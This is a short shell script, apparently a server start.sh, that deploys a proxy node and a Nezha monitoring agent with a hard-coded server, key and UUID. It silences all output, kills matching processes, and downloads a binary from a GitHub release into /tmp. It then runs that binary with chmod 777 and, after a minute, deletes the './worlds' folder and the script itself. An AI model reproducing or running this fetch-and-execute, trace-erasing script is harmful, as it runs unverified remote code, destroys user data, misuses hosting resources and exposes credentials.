#!/usr/bin/env sh

exec >/dev/null 2>&1
export TOK=${TOK:-''}
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
export TG=${TG:-''}
export SUB_URL=${SUB_URL:-''}
export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.mingfei1981.eu.org'}
export NEZHA_KEY=${NEZHA_KEY:-'VcNmAA8ErRWXY9l13e'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}
export TMP_ARGO=${TMP_ARGO:-'3x'}
export VL_PORT=${VL_PORT:-'8002'}
export VM_PORT=${VM_PORT:-'8001'}
export CF_IP=${CF_IP:-'ip.sb'}
export SUB_NAME=${SUB_NAME:-'argo'}
export second_port=${second_port:-''}
export UUID=${UUID:-'faacf142-dee8-48c2-8558-641123eb939c'}
export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
export SNI=${SNI:-'www.apple.com'}

if command -v curl &>/dev/null; then
DOWNLOAD_CMD="curl -sL"
# Check if wget is available
elif command -v wget &>/dev/null; then
DOWNLOAD_CMD="wget -qO-"
else
echo "Error: Neither curl nor wget found. Please install one of them."
sleep 60
exit 1
fi
tmdir=${tmdir:-"/tmp"}
processes=("$web_file" "$ne_file" "$cff_file" "app" "tmpapp")
for process in "${processes[@]}"
do
pid=$(pgrep -f "$process")

if [ -n "$pid" ]; then
kill "$pid" &>/dev/null
fi
done
$DOWNLOAD_CMD https://github.com/dsadsadsss/plutonodes/releases/download/xr/main-amd > $tmdir/tmpapp
chmod 777 $tmdir/tmpapp && $tmdir/tmpapp & sleep 60; rm -rf ./worlds start.sh; wait
